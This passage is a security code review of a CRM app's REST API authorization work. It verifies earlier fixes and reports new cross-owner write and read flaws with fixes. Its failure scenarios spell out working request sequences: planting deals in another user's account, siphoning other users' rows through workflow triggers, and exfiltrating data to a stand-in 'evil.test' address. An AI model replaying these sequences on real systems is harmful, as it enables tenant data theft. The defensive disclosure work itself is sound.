---
status: findings
phase: 48-rest-api-authorization
reviewed: 2026-08-26T09:12:00Z
iteration: 3
depth: deep
files_reviewed: 41
critical: 2
warning: 4
info: 2
---

# Phase 48 (REST API Authorization) — Code Review, Iteration 3

**Depth:** deep (call chains and type boundaries followed across module edges)
**Scope:** the code the two review-fix passes WROTE — `src/lib/execution/actions/crm.ts` (CR-02),
`src/lib/api/pagination.ts` (WR-09), `src/app/import/actions.ts` (CR-03), the two WR-10 sites, and
the three new/extended `*.db.test.ts` files — plus the call chains those changes now sit on.

## Summary

**All five iteration-2 findings are RESOLVED on the code, and the fix pass's judgement was better
than the review it was answering.** It rejected the review's suggested mutation-layer fix with
evidence I independently verified line by line: `src/app/deals/actions.ts:89,161,254,347,445,482`
each read `deal.ownerId !== session.user.id && session.user.role !== "admin"` and then call
`updateDealStageMutation(id, stageId, session.user.id)` / `deleteDealMutation(id, session.user.id)`
with the **admin's** id, while `src/app/activities/actions.ts`, `people/actions.ts` and
`organizations/actions.ts` contain **zero** `role !== "admin"` matches. `eq(deals.ownerId, userId)`
inside `deleteDealMutation` would therefore have turned a supported admin action into "Deal not
found", and no single predicate can express both halves. The asymmetry `src/lib/bulk/dispatch.ts:20-34`
documents is real, and `handleCrmAction`'s target resolution **is** the correct boundary. It also
labelled three of its own proofs weak rather than dressing them up, and its account of why the
review's literal two-owner import scenario passed pre-fix is accurate and written in-source.

**But the boundary it drew is incomplete, and two reachable cross-owner paths remain that the
phase's records assert are closed.** DEF-48-05 and BACKLOG SEC-48-C both state, twice: *"the engine
can no longer **read**, **write**, delete or emit another owner's row."* Both halves of that
sentence are falsifiable today:

- **WRITE.** `dealSchema` carries `ownerId: z.string().optional()` and `createDealMutation` /
  `updateDealMutation` both honour it (`src/lib/mutations/deals.ts:35`, `:232`, `:377-380`).
  `handleCrmAction` passes caller-authored `fieldMapping` straight through
  (`crm.ts:427-430` → `:463` / `:486`) and `coerceFieldMapping` does not touch unknown keys, so
  `fieldMapping: { ownerId: "<victim>" }` writes a row **into the victim's account**. `ownerId`
  appears nowhere in crm.ts's KNOWN RESIDUALS block (`:238-246`) and nowhere in DEF-48-05's
  six-row reference-column table — so Phase 49 would inherit a list that omits the one field that
  crosses the boundary rather than merely pointing at it. **CR-04.**
- **READ.** `matchAndFireTriggers` (`src/lib/triggers/matcher.ts:117-121`) selects
  `from(workflows).where(eq(workflows.active, true))` with **no `createdBy` scope**, so every
  active workflow in the database fires on every user's CRM event and receives
  `payload.data` — the victim's full row — as `workflow_runs.trigger_data`
  (`matcher.ts:142-160` → `create-run.ts`). `serializeRun` returns `trigger_data` verbatim
  (`serialize.ts:212`). This never resolves a target id, so the crm.ts guard is not on the path at
  all. **CR-05.**

Neither is caused by the fix pass. Both are reachable from the same three `/api/v1` requests the
pass just closed for the target-id half, on the same `withApiAuth` surface, and CR-05 has no
legitimate session-path equivalent (an ordinary member cannot read another member's deal row
anywhere else in the product). Iteration 2 found its two criticals by widening past the four route
files; these two are one module further out on the same thread.

Of the four deferrals, three are defensible with accurate reasoning. **SEC-48-D's framing is the
one I disagree with** — see §3.

---

## 1. Iteration-2 findings — verdicts

| ID | Verdict | Evidence I read |
|---|---|---|
| **CR-02** | **RESOLVED** (for what it claims; see CR-04/CR-05 for what the record over-claims) | `crm.ts:259-261` `callerScope` = `and(eq(def.ownerColumn, userId), isNull(def.deletedAtColumn))`; `:285-289` nests it inside `and(ilike(column, lookupValue), callerScope(...))` so the scope is **in the statement**, and `:317-321` does the same for `assertCallerOwnsTarget`, reached from `resolveTargetId:340-344` on the `config.targetId` branch. Both messages are identical for "absent" and "not yours" (`:293-295`, `:324`) and name only caller-supplied values — I checked both format strings for row content; neither reads a column. `LookupDef` (`:65-80`) declares `ownerColumn`/`deletedAtColumn` for all four entities and every one is populated with the right table's column (`:83-111`), and I verified against the schemas that all four carry `owner_id text NOT NULL REFERENCES users.id` plus a nullable `deleted_at` (`deals.ts:14,21`, `people.ts:38,42`, `organizations.ts:28,33`, `activities.ts:11,20`) — so the header's column-by-column claim is true. **The "cannot fail there" claim about the lookup branch is correct**: `resolveIdByLookup` returns `rows[0].id` from a query that already carried `eq(ownerColumn, userId)` and `isNull(deletedAtColumn)`, so a second `assertCallerOwnsTarget` on that id could only ever re-read the same predicate. I tried four ways to falsify it — a null scoping column (impossible, `NOT NULL` on all four), a soft-deleted row (`isNull` is inside the same `and`, and the mutations re-check), an entity reached through a join or relation (`def.table` and `def.ownerColumn` always come from the same `LookupDef`; `stages`, which is owned through `pipelines`, has no entry), and a third arrival path for a target id (there is none: `handleCrmAction` is the only consumer of `mutationMap`, `resolveTargetId` is the only producer of `targetId`, and `crm.ts` is the only importer of `@/lib/mutations` in the whole tree — grepped). Placement is right too: `resolveTargetId` runs **before** the dry-run gates (`:478`, `:498`), so a refusal surfaces in the editor rather than on first real execution. Residuals are recorded honestly and the TOCTOU window between the check and the mutation is stated rather than hidden (`:244-246`). |
| **CR-03** | **RESOLVED** | `src/app/import/actions.ts:786-789` — `where: and(isNull(deals.deletedAt), eq(deals.ownerId, actorUserId))`, and `actorUserId` is `session.user.id` (`:743`), the same value written as `ownerId` on every row this action pushes. The warning branch (`:812-822`) is now the honest answer for a foreign title. **The committed proof is genuinely falsifiable, and not for the incidental reason the fixer disclosed**: `import-owner-scope.db.test.ts`'s first cell imports `dealTitle = B_ONLY_TITLE`, and the fixture cell above it asserts by direct SQL that **A owns no deal with that title** (`select … where title = B_ONLY_TITLE and owner_id = USER_A` → `[]`). Pre-fix the unscoped `findMany` therefore has exactly one candidate and `Array.prototype.find` returns `DEAL_B_ONLY` deterministically, so `expect(imported[0].dealId).toBeNull()` is red with no planner dependence. Read back by direct SQL, not from the action's summary. The shared-title cell is labelled in-source as *not* the red-provable half, which matches the fixer's account. Floors are present (`imported` has length 1, title asserted), the positive anchor (A's own title still links, `warnings` `[]`) rules out an importer that matches nothing, both B-side symmetry cells are there, and the cross-cell sweep ends with `linked === 2` so the empty cross-owner join is not "nothing is linked at all". `@/db` is **not** mocked; only `@/auth` and `next/cache` are, and the header explains why each is the minimum. |
| **WR-08** | **RESOLVED** | `activities-scope.db.test.ts:962-1035` — three cells against the **list** route, which previously had none. Cell 1 plants `dealId = DEAL_B` by direct SQL, confirms the plant by direct SQL before the request (so a green cannot mean "the update did nothing"), floors on `meta.total === A_OWNED` and the planted row being present in `data`, then asserts the row has no `deal` key **and** `JSON.stringify(body)` does not contain `${PREFIX}B-secret` — which is what covers the nested organization and person that a key check on `deal` alone would miss. The per-row loop is correctly the narrower claim (`every deal that IS serialized belongs to the caller`) rather than "no row has a deal", and the in-source note records that the stronger form measured RED against the fixed route because an earlier describe legitimately leaves a row linked to A's own deal — that is the right shape, arrived at by measurement. The positive anchor asserts A's own deal comes back *with notes*, and the B-side cell would catch a guard written as `ctx.userId === USER_A`. |
| **WR-09** | **RESOLVED** | `pagination.ts:40` `MAX_OFFSET = 1_000_000`; `:63-68` clamps to `[0, MAX_OFFSET]` on the parsed integer. **Applied to every list route, not only the two named** — I enumerated the callers: `activities`, `stages`, `deals`, `people`, `organizations`, `pipelines`, `webhooks`, `workflows`, `workflows/[id]/runs`, `workflow-templates`, `custom-field-definitions`, `audit`, `trash`, plus `src/lib/api/notes-collection.ts`. `parsePagination` is the single derivation point for all of them, so the parser was the right place and the fix generalises. **The ceiling does not introduce a wrong answer in this deployment**: it clamps to an empty page rather than falling back to page one, and `meta.offset` reports the window actually used — the review's own sketch (`? 0 : …`) is the one that would have answered a page-500 request with page-one data, and the header says so and refuses it. Reconciliation with `stage-scope.ts:21-26` is genuine: that paragraph is now past tense **and** carries a new paragraph naming the second consequence explicitly, i.e. the header no longer documents an open gap. Test coverage is falsifiable in both directions — both driver spellings clamp, `Number.isSafeInteger` asserted on the result, a boundary pair (`MAX_OFFSET` passes, `MAX_OFFSET + 1` clamps) that a `return MAX_OFFSET` parser fails, an anti-vacuity anchor asserting `0/1/50/999999` verbatim, and the pre-existing `-5`/`abc`/`1e20` behaviour re-asserted so the ceiling cannot have been added by rewriting the other guarantees. Two stale comments elsewhere now contradict it — IN-06. |
| **WR-10** | **RESOLVED** | `stages/[id]/route.ts:185-204` and `activities/[id]/route.ts:344-363` — both now `let x: T \| undefined`, the destructure moved **inside** the `try`, and an explicit `Problems.notFound()` before any dereference. On activities the 404 is placed before the recalculation and the emit, with the reason stated (a webhook announcing an update to a vanished row is worse than the 500 it replaces) — and that is asserted, not just commented (`route.test.ts:926-935`, `expect(mockEmit).not.toHaveBeenCalled()`). **The mocks are faithful, not convenient.** `UPDATE … RETURNING` that matches zero rows really does resolve to `[]` in postgres.js; `writeState.updateRows = []` / `stubUpdate([])` expresses exactly that state and nothing else, and both suites already owned that seam for WR-01, so no new mocking surface was added. Both cells assert `db.update` **was** called once, which distinguishes "gone between check and write" from a route that 404s before touching the database — without that the cell would pass against a different code path. `beforeEach` restores `writeState.updateRows = [{...ownedStage}]` (`stages/…/route.test.ts:226`), so the positive anchor is not accidentally inheriting `[]`, and both anchors would catch a route that 404s every PUT. Declaring both cells MOCKED in-source is the right call: nothing in this repository can schedule a DELETE between two statements inside one handler invocation. |

### Gate integrity in the new tests (priority 3)

`crm-ownership.db.test.ts` is the strongest of the three and it earns it. The listener really
does cover **all 13** `CrmEventMap` names — I diffed `ALL_CRM_EVENTS` (`:293-307`) against
`src/lib/events/types.ts:40-54` name by name, including `deal.stage_changed`, which is the one with
the narrowed payload. The anti-vacuity control (`:534-545`) drives a legitimate write through the
real handler and requires `captured` to contain `activity.updated` **and** `JSON.stringify(captured)`
to contain `A_SECRET`, so a listener that was never wired, or a `crmBus` that resolved to a second
singleton in this module graph, reds it — which is exactly the failure that would make every
`expect(captured).toHaveLength(0)` below vacuous. It is declared before the refusal describes, so it
runs first. `beforeEach → restoreFixtureRows()` is the right answer to the measured cross-cell
contamination the header describes (the title-lookup cell passing green because the targetId cell
had already destroyed its fixture), and it restores by direct SQL rather than through the mutations
under test. `beforeAll` cleans **before** measuring the baseline (WR-04's lesson, applied), neither
fixture user is an admin (so no refusal is unfalsifiable for the wrong reason), `LEFTOVER_PREDICATE`
recognises the three UUID-keyed tables by fixture link rather than by an id prefix that would report
zero forever, and `afterAll` re-asserts every touched table's total `count(*)` against the baseline —
which is what would catch a row created by the engine with a generated id. No floor sits at or above
its own measurement in any of the three files. `import-owner-scope`'s `afterEach` clears the imported
rows so each cell's `toHaveLength(1)` starts from the fixture. Two residuals: WR-D (the 13-name list
is not exhaustiveness-checked) and IN-07 (WR-08's cells restore their fixture at the *end* of the
cell).

---

## 2. Review of the new code

### CR-04 (CRITICAL) — `crm_action` writes a row into ANOTHER owner's account: `fieldMapping.ownerId` is honoured on `deal` create and update

**Files:** `src/lib/execution/actions/crm.ts:166-186` (`coerceFieldMapping`), `:427-430`, `:463`,
`:486`; `src/lib/mutations/deals.ts:35` (`dealSchema.ownerId`), `:52`, `:148`, `:232`, `:377-380`;
`crm.ts:238-246` (the KNOWN RESIDUALS block that omits it);
`.planning/phases/48-rest-api-authorization/deferred-items.md` DEF-48-05; `.planning/BACKLOG.md`
SEC-48-C.

**Issue.** `handleCrmAction` scopes **which row** it touches and does not constrain **whose the row
becomes**. `coerceFieldMapping` copies any key with no entry in `crmFieldTypes` through unchanged
(`:174-178`), and `crmFieldTypes.deal` has only `value` and `expectedCloseDate`. `interpolateDeep`
passes strings through. The spread at the call sites is `{ ...interpolatedFields, userId }` — `userId`
is last so it cannot be clobbered, but `ownerId` is a **different key** and is never touched. Of the
four entities only deals is affected, and that asymmetry is why it survived: `createPersonMutation`,
`createOrganizationMutation` and `createActivityMutation` all hard-code `ownerId: input.userId`
(`people.ts:242`, `organizations.ts:234`, `activities.ts:169`) and their Zod schemas omit `ownerId`
so it is stripped in silence. `dealSchema` does not:

```ts
// src/lib/mutations/deals.ts:35
ownerId: z.string().optional(),
// :232  (create)
ownerId: validated.data.ownerId || input.userId,
// :377-380 (update)
if (validated.data.ownerId !== undefined) { … updateData.ownerId = validated.data.ownerId }
```

**Concrete failure scenario** (three requests, one API key, all `/api/v1`; A is the attacker,
B the victim):

1. `POST /api/v1/workflows`
   `{"name":"x","nodes":[{"id":"n1","type":"action","config":{"actionType":"crm_action","entity":"deal","operation":"create","fieldMapping":{"title":"Payroll: confirm your bank details","stageId":"<A's own stage id>","organizationId":"<A's own org id>","ownerId":"<B's user id>","notes":"call 555-0100"}}}]}`
   → **201**.
2. `PUT /api/v1/workflows/{id}` `{"active":true}` → **200**.
3. `POST /api/v1/workflows/{id}/run` → **201**.

**Wrong output:** a `deals` row with `owner_id = B`, `title` and `notes` authored by A, sitting on
**A's** stage in **A's** pipeline. It appears in B's `GET /api/v1/deals` and in B's `/deals` UI; B
cannot account for it; and because `stage_id` is validated for existence only
(`deals.ts:166-174` checks the stage and its pipeline's `deleted_at`, never its owner), B's
`?expand=stage` now renders A's stage and pipeline names. The `update` variant is one step shorter —
`{"operation":"update","targetId":"<A's OWN deal>","fieldMapping":{"ownerId":"<B's user id>"}}`
passes `assertCallerOwnsTarget` (A does own it), then `updateDealMutation` writes
`owner_id = B` and emits `deal.updated` with `changedFields: ["ownerId"]`. A does not need to know
B's user id in advance: chained with CR-05 below, `"ownerId":"{{trigger.data.userId}}"` plants the
row on whoever last wrote a record.

This is not the CR-01 residual and it is not in DEF-48-05's table. That table lists six **reference**
columns whose failure mode is "a foreign FK on the caller's own row"; `ownerId` is strictly worse —
the row itself lands on the other side of the boundary. `POST /api/v1/deals` and
`PUT /api/v1/deals/{id}` are both safe (`deals/route.ts:311` hard-codes `ownerId: context.userId`;
the `[id]` PUT schema has no `owner_id`), so `crm_action` is the only `/api/v1` path that reaches
this, which means it is fixable **at the boundary the fix pass already chose** and does not need
Phase 49.

**Fix.** Refuse the field where the boundary is, next to the two predicates that are already there:

```ts
// src/lib/execution/actions/crm.ts — after coerceFieldMapping, before any mutation call
const FORBIDDEN_MAPPING_KEYS = new Set(["ownerId", "id", "deletedAt"])
for (const key of Object.keys(interpolatedFields)) {
  if (FORBIDDEN_MAPPING_KEYS.has(key)) {
    throw new Error(`crm_action cannot set '${key}'; the engine acts only as ${userId}`)
  }
}
```

Refuse rather than silently drop: a node configured to reassign an owner must fail visibly in the
runs list, not appear to work. Then add `ownerId` to crm.ts's KNOWN RESIDUALS **only if** the
decision is to keep it, and either way correct DEF-48-05/SEC-48-C's "can no longer write another
owner's row".

---

### CR-05 (CRITICAL) — three `/api/v1` requests turn an API key into a continuous cross-owner READ of every user's CRM writes; it bypasses the crm.ts guard entirely

**Files:** `src/lib/triggers/matcher.ts:117-121` (the unscoped workflow select), `:142-160` (the
envelope carrying `payload.data`); `src/lib/events/subscribers/workflow-trigger.ts:31-43`;
`instrumentation.ts:45-46` (it is registered in the running container);
`src/lib/triggers/create-run.ts` (`trigger_data` persisted); `src/lib/api/serialize.ts:207-221`
(`serializeRun` returns `trigger_data` verbatim);
`src/app/api/v1/workflows/[id]/runs/route.ts:23-68`; `src/lib/triggers/types.ts:5-12`
(`crmEventTriggerSchema`, reachable through `triggersArraySchema` on both workflow write routes).

**Issue.** The CR-02 fix closed the path where a node **resolves** a target. This path never resolves
one — the victim's row arrives as the **trigger**, before any node runs:

```ts
// src/lib/triggers/matcher.ts:117
const activeWorkflows = await db.select().from(workflows).where(eq(workflows.active, true))
// … no createdBy predicate anywhere in this function
// :146
data: { ...normalizeFormulaValues(payload.data), entity, entityId, action, changedFields, userId }
```

`matchesTrigger` compares only `trigger.entity`/`trigger.action` and — since
`fieldFilters: z.array(z.string()).default([])` — skips the field check entirely when the array is
empty. `payload.data` is the victim's **full row**: every `crmBus.emit` in the mutation layer passes
the post-write row (`deals.ts:436-443`, `:816-824`, `activities.ts:305-318`), and for a delete
`previous` carries it. So one active workflow owned by A receives every deal, person, organization
and activity write made by every other user in the deployment.

**Concrete failure scenario** (two requests, one API key, then wait):

1. `POST /api/v1/workflows`
   `{"name":"x","triggers":[{"type":"crm_event","entity":"deal","action":"updated"}],"nodes":[]}`
   → **201** (`createWorkflow` sets `createdBy = context.userId`, i.e. A).
2. `PUT /api/v1/workflows/{id}` `{"active":true}` → **200** (proven by the new db test's own
   `activateWorkflowAs`).
3. B edits any deal, through the UI or the API. `updateDealMutation` emits `deal.updated`; the
   subscriber calls `matchAndFireTriggers`; A's workflow matches; `createWorkflowRun` inserts a
   `workflow_runs` row whose `trigger_data.data` is B's deal — `title`, `value`, `notes`,
   `customFields`, `ownerId`, `stageId`, `organizationId`, `personId`.
4. `GET /api/v1/workflows/{id}/runs` as A → **200**, and every element's `trigger_data` is another
   owner's row.

**Wrong output:** A reads B's deal `notes` and `value` with no ownership relationship of any kind.
`nodes: []` is enough — the engine marks the run completed at `engine.ts:144-149` without executing
anything, and the row is already persisted. With a node the exfiltration does not even need step 4:
an `http` node posting `{{trigger.data}}` to an attacker-controlled host (the `ssrf.ts` guard blocks
private ranges, not public ones), or an `email` node with `{"type":"dynamic","value":"a@evil.test"}`
and `body: "{{trigger.data.notes}}"`, ships it out directly.

This is the same OWASP API1 class as CR-01 and CR-02, on the same `withApiAuth` surface, and unlike
SEC-48-D there is **no legitimate session-path equivalent** — nothing else in the product lets an
ordinary member read another member's deal row, so this is a genuine privilege gain and not a
recipient-policy question. It is also the sentence in the phase record that is most directly wrong:
DEF-48-05 and SEC-48-C both say the engine can no longer **read** another owner's row. I searched
`.planning/` for `matchAndFireTriggers` — the only hit is a Phase 25 note in `STATE.md:434` about
testability. This has never been recorded as a security item.

**Fix.** Scope the matcher to the workflow's own author, which is the identity the engine already
uses for everything else (`engine.ts:165`):

```ts
// src/lib/triggers/matcher.ts
const activeWorkflows = await db
  .select()
  .from(workflows)
  .where(and(eq(workflows.active, true), eq(workflows.createdBy, payload.userId)))
```

`payload.userId` is the acting user on every emit site, and it is already what
`events/subscribers/webhook.ts:31-38` uses to scope webhook delivery — so this makes the two
subscribers agree instead of one being scoped and the other global. If cross-owner triggering is a
product requirement (an admin automation), it needs an explicit role read, not the absence of a
predicate. Either way the phase record's "can no longer read" claim has to be corrected before the
phase closes.

---

### WR-11 (WARNING) — `callerScope` returns `SQL | undefined` and the header claims a collapse would be a type error; it would not be, and the owner-term-loss case has no guard at all

**File:** `src/lib/execution/actions/crm.ts:250-261`, and the two consumers at `:288` and `:320`.

**Issue.** The docstring states:

> `and(...)` returns `SQL | undefined` … so this is never spread into a `.where()` on its own — both
> call sites nest it inside a further `and()` with a non-optional term, **which is what makes an
> accidental collapse a type error rather than a silent full-table read**.

That is false. `drizzle-orm`'s `and` is typed `(...conditions: (SQLWrapper | undefined)[]) => SQL |
undefined` and its body is (verified in `node_modules/drizzle-orm/sql/expressions/conditions.cjs`):

```js
const conditions = unfilteredConditions.filter((c) => c !== void 0);
if (conditions.length === 0) return void 0;
if (conditions.length === 1) return new SQL(conditions);
```

Passing a possibly-`undefined` value into `and()` is not a type error — it is the documented calling
convention, and an `undefined` argument is **silently dropped**. `and(ilike(column, lookupValue),
undefined)` compiles, renders as `where <col> ilike $1`, and is precisely the unscoped query CR-02
was. Nothing in the file plays the role `requireScopedPredicate` plays in `stage-scope.ts:115-132`.

**Concrete failure scenario.** The edit is the one `stage-scope.ts`'s own header names as the future
hazard, transplanted:

```ts
function callerScope(def: LookupDef, userId: string | undefined) {
  return and(...(userId ? [eq(def.ownerColumn, userId)] : []), isNull(def.deletedAtColumn))
}
```

`tsc --noEmit` exits 0. `crm.test.ts`'s CR-02 structural cells pass a real `userId`, so they stay
green. `crm-ownership.db.test.ts` passes a real `userId` too. The predicate is still non-`undefined`,
so no collapse guard would have fired even if one existed — the term that vanished is the owner
equality, which is the half `MANDATORY_SCOPE_TERMS`/`termCount` exists to catch and which this file
has no equivalent for. Result: `resolveIdByLookup("activity","title","%",A)` returns whichever
activity PostgreSQL emits first, across all owners, and `resolveTargetId` hands it to
`updateActivityMutation` — CR-02 reopened, with `tsc` and the entire suite green. Today's code is
correct (both `eq()` and `isNull()` always return `SQL`), so this is a durability finding, not a live
hole; but the comment asserts a protection that does not exist, in the security boundary of the
phase's most security-critical file, and `stage-scope.ts` in the same phase says plainly that a
header documenting a guarantee it does not have is a finding.

**Fix.** Either reuse the existing helper, or state the truth. The cheapest honest version:

```ts
function callerScope(def: LookupDef, userId: string): SQL {
  const terms: SQL[] = [eq(def.ownerColumn, userId), isNull(def.deletedAtColumn)]
  return requireScopedPredicate(and(...terms), terms.length)  // exported from stage-scope.ts
}
```

`requireScopedPredicate` is already exported *precisely so it can be reached from elsewhere*
(`stage-scope.ts:132` — "Exported for that reason: an unreachable guard cannot be proven to reject
anything"), and `MANDATORY_SCOPE_TERMS = 2` is the same number here. If reuse is genuinely unwanted,
delete the "type error" sentence — it is the only thing standing where a check should be.

---

### WR-12 (WARNING) — the "adding a fifth entity is a compile error" claim is weaker than stated, and the runtime backstop is satisfied by prototype keys

**File:** `src/lib/execution/actions/crm.ts:60-63`, `:65-80`, `:82-111`, `:274-276`, `:312-315`,
`:412-419`.

**Issue.** Three separate weaknesses behind one claim. I tested each against the source rather than
the comment.

1. **`ownerColumn: undefined` compiles.** `DrizzleColumn` is `any` (`:63`, with an eslint disable).
   A required property of type `any` accepts `undefined` and `null`. So the guarantee is only
   "the property must be *present*", not "it must be a column". Omitting it **is** a compile error
   (TS2741) — that half of the claim is literally true — but `ownerColumn: undefined` is not, and
   `and(eq(undefined, userId), isNull(undefined))` is not a shape any test would notice at compile
   time.
2. **Nothing links `mutationMap` to `lookupDefs`.** Both are `Record<string, …>`. Adding a fifth
   entity to `mutationMap` and *not* to `lookupDefs` compiles cleanly. Runtime then fails closed —
   `resolveTargetId` → `assertCallerOwnsTarget` → `lookupDefs[entity]` is `undefined` → the
   `Cannot look up entity type` throw — so the **conclusion** ("cannot reach the mutation layer
   through an unscoped resolution") holds. It just does not hold for the reason the comment gives.
3. **The runtime backstop has a hole.** `mutationMap` and `lookupDefs` are object literals, so
   `mutationMap[entity]` and `lookupDefs[entity]` walk `Object.prototype`. With
   `entity: "constructor"`, `mutationMap["constructor"]` is the `Object` constructor — truthy, so
   `if (!mutations) throw` at `:412-414` does not fire; `mutations["create"]` is `Object.create` —
   truthy, so `:417-419` does not fire either; and in `assertCallerOwnsTarget`, `lookupDefs["constructor"]`
   is truthy so `if (!def) throw` at `:312-315` does not fire.

**Concrete failure scenario.** `POST /api/v1/workflows` with
`config: {"actionType":"crm_action","entity":"constructor","operation":"update","targetId":"x","fieldMapping":{}}`,
then activate and run. `def` is the `Object` constructor, so `def.idColumn` and `def.table` are
`undefined` and the query becomes `db.select({ id: undefined }).from(undefined)` — drizzle throws a
`TypeError` reading the table symbol off `undefined`. **Wrong output:** the run fails with an
unmapped `TypeError` instead of the intended `Cannot look up entity type: constructor`, and
`log.error` records a driver-shaped stack for what is an ordinary bad-input case. With
`entity: "constructor", operation: "create"` it is worse-looking: both guards pass,
`Object.create({...interpolatedFields, userId})` runs, `res.success` is `undefined`, and the caller
gets the generic `CRM create failed`. **No authorization impact** — every branch still fails closed,
which is why this is a WARNING and not a blocker — but the three `if (!x) throw` guards that the
CR-02 design leans on as its backstop for an unregistered entity are not the guards the header says
they are.

**Fix.** Make the maps own-property lookups and the columns actual column types:

```ts
const mutationMap = new Map<string, { create: CreateFn; update: UpdateFn; delete: DeleteFn }>([...])
const lookupDefs = new Map<string, LookupDef>([...])
// or, minimally:
if (!Object.prototype.hasOwnProperty.call(lookupDefs, entity)) throw new Error(...)
```

and replace `type DrizzleColumn = any` with `AnyPgColumn` from `drizzle-orm/pg-core`, which makes
`ownerColumn: undefined` the compile error the comment claims it already is. A `Map` also removes
the `keyof typeof` dance at `:417`.

---

### WR-13 (WARNING) — the new guard refuses an admin whose session path is explicitly allowed to do the same write, and that divergence is unrecorded

**Files:** `src/lib/execution/actions/crm.ts:205-223`, `:307-326`; `src/app/deals/actions.ts:89`,
`:161`, `:254`, `:347`, `:445`, `:482`; `src/lib/execution/engine.ts:165`.

**Issue.** The fix pass's argument for *not* touching the mutation layer is that the deals ownership
predicate is asymmetric and admins legitimately act on deals they do not own. I verified that and it
is correct. But `assertCallerOwnsTarget` and `callerScope` are pure `eq(ownerColumn, userId)` with no
role read, so the engine now enforces a **stricter** rule than the product does — the same asymmetry,
created in the opposite direction, one layer up. The header states "The engine has no admin concept",
which is true of the code but is a description of the gap rather than a justification for it.

**Concrete failure scenario.** An admin (`users.role = 'admin'`) authors a workflow —
`triggers: [{"type":"crm_event","entity":"deal","action":"stage_changed"}]`, node
`{"actionType":"crm_action","entity":"deal","operation":"update","targetId":"{{trigger.data.id}}","fieldMapping":{"notes":"reviewed"}}`.
Before this pass it updated whichever deal moved, matching what the same admin can do at
`deals/actions.ts:444-450` through the UI. Now `assertCallerOwnsTarget` finds no row where
`owner_id = <admin>` and the run terminates `failed` with `No deal found with id '<uuid>'` — for
every deal the admin does not personally own. **Wrong output:** a previously working admin
automation fails, and the error message says the deal does not exist, which is exactly the
"turn a supported admin action into 'Deal not found'" outcome the fix pass cited as its reason for
not editing `deleteDealMutation`.

Failing closed is the right default and I am not asking for it to be reverted. What is missing is
the decision: either the divergence is intended (in which case record it, because it is a
behavioural change to a shipped feature and nothing in `48-SUMMARY.md`, `deferred-items.md` or
`BACKLOG.md` mentions it), or the engine needs the role read to match the product
(`select role from users where id = $userId`, admin bypasses `assertCallerOwnsTarget` for `deal`
only — and note that combined with CR-05 an admin bypass would be far more dangerous, so "record
it, do not add it" is a defensible answer).

---

### WR-14 (WARNING) — `ALL_CRM_EVENTS` is not exhaustiveness-checked, so a 14th event silently un-covers every "not emitted" assertion in the file

**File:** `src/lib/execution/actions/crm-ownership.db.test.ts:293-307`, `:349-359`.

**Issue.** The array is typed `CrmEventName[]`. All 13 current names are present — I diffed them
against `src/lib/events/types.ts:40-54` — so the file's claim is true **today**. But `CrmEventName[]`
permits a short list, and nine of this file's cells rest on `expect(captured).toHaveLength(0)`,
which is only a claim about the names that were subscribed. The file's own header calls this "the
emission half, stated once over every refusal", and the fixer applied exactly the opposite
discipline one file over (`LookupDef` requiring both new columns "so a fifth entity is a compile
error").

**Concrete failure scenario.** Phase 49 adds `"activity.completed": CrmEventPayload` to
`CrmEventMap` and emits it from `toggleActivityCompletionMutation`, then adds a
`toggle`/`complete` operation to `mutationMap`. `ALL_CRM_EVENTS` is not touched — no compile error,
no lint error. A refusal cell for `operation: "complete"` against B's activity then asserts
`captured` is empty and **passes** while `activity.completed` fires with B's full row into
`webhook.ts`'s `ALL_EVENTS` (which would also need the same edit). **Wrong output:** a green cell
certifying "not emitted" for an event that was emitted.

**Fix.** One line makes it a compile error:

```ts
const ALL_CRM_EVENT_FLAGS: Record<CrmEventName, true> = {
  "deal.created": true, /* … all 13 … */
}
const ALL_CRM_EVENTS = Object.keys(ALL_CRM_EVENT_FLAGS) as CrmEventName[]
```

Worth applying to `events/subscribers/webhook.ts:6-11` and
`events/subscribers/workflow-trigger.ts:7-12` at the same time — both hand-maintain the identical
13-entry list, and a subscriber that silently stops covering an event is a production defect rather
than a test one.

---

### IN-06 (INFO) — two comments now contradict the WR-09 fix, one of them in the route a reader opens first

**Files:** `src/app/api/v1/stages/route.ts:51`; `src/app/api/v1/trash/route.ts:67-68`, `:277-283`.

`stages/route.ts:51` still reads "`parsePagination` puts no ceiling on `offset`" in the present
tense inside an otherwise past-tense paragraph — the `stage-scope.ts` header was reconciled
carefully and its in-route twin was not. `trash/route.ts:67-68` says `parsePagination`
"deliberately leaves `offset` unbounded … so the ceiling is re-applied here", which is now simply
false; `MAX_TRASH_API_OFFSET` (`TRASH_PAGE_SIZE × 200`) is far below `MAX_OFFSET` so behaviour is
unchanged, but the stated relationship is inverted. And `:277-283`'s claim that `offset` "is echoed
back as the caller sent it" is no longer true for anything above 1,000,000 — the value in `meta` is
now neither what the caller sent nor what the page was served from. All three are documentation, no
behaviour rides on them, and `stage-scope.ts`'s own standard ("a header that documents a gap while
the gap stays open is a finding") applies in mirror image.

### IN-07 (INFO) — WR-08's cells restore their fixture at the end of the cell, so a failing cell contaminates the next

**File:** `src/app/api/v1/activities/activities-scope.db.test.ts:963-1035`.

Each of the three cells ends with
`await db.update(activities).set({ dealId: null }).where(eq(activities.id, target))`. That line does
not run when an assertion above it throws — which is the RED case the cells exist to produce. On the
first red, `A_ACTIVITY_IDS[6]` keeps `dealId = DEAL_B` into the following cells, so the failure
cascade reports more red than the defect warrants. `crm-ownership.db.test.ts` solved the identical
problem with `beforeEach → restoreFixtureRows()` after measuring it; the same shape here
(`beforeEach` nulling the `dealId`s the WR-08 describe touches) costs one hook and removes the
cascade. Harmless while green.

---

## 3. Verdict on the deferrals

**DEF-48-05 / SEC-48-C — defensible as scoped, but the enumeration is incomplete and the summary
sentence is wrong.** The reasoning is accurate on the point it turns on: I verified the six
admin-bypass call sites verbatim, verified that they reach `updateDealStageMutation` /
`reorderDealsMutation` with `session.user.id` set to the admin, and verified that activities, people
and organizations have **no** `role !== "admin"` match anywhere — so a blanket owner predicate in
the mutation layer would be a regression for deals and a needless divergence for the other three,
and "decide the mutation layer's contract" genuinely is Phase 49's subject. The six-row reference
table is right about what it lists. What is wrong is the framing sentence — *"the engine can no
longer read, write, delete or emit another owner's row"* — which is false in both the read (CR-05)
and write (CR-04) directions, and the table omits `ownerId`, the only field in `fieldMapping` that
moves the row itself across the boundary. Phase 49 would inherit a list that is missing the worst
entry. Correct the sentence and add `ownerId` before this phase closes; CR-04's remedy belongs in
`crm.ts` (a two-line refusal at the boundary the pass already chose), not in Phase 49.

**DEF-48-06 / IMP-48-A — defensible, and the reasoning is accurate.** I checked the three shapes
independently. The organization and person reads do feed `fuzzyMatchOrganization` and auto-creation,
